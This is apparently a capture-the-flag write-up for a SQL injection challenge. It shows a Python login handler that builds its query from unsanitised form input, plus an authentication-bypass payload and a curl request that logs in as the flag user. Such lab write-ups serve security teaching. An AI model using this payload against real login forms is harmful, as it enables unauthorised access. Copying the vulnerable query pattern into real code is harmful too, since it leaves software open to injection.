# Level 4

As usual we are given with a task to `Exploit a structured query language injection vulnerability to login`

we got the machine and souce code for the challenge

```python copy {13} /{username}/ /{password}/

def level4():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

```

we can see that the user input is not sanitized and we can use sql injection to get the flag

```sql
username" or 1=1 -- -"
```

Example request

```bash
curl -X POST http://challenge.localhost:80/ -d 'username=" or 1=1 -- -&password=spear'
```

This will redirect us to the home page containing flag ðŸš©
